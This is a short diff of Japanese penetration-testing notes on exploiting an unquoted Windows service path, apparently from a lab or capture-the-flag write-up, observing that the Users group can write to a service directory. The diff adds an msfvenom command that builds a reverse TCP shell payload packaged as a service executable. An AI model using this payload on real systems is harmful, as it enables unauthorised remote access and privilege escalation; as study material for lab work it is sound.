@@ -40,5 +40,7 @@ C:\Windows\system32>
 - Unquoted Serviceなので、[[💥Windows Privilege Escalation#Service Exploits - Unquoted Service Path]]を使う
 - 自分のグループ（BUILTIN\Users）は、`C:\Skylark\Development Binaries 01`にデータの追記、書き込みが可能
 
-
+```sh
+msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT=<Port> -f exe-service -o [output.exe]
+```
 
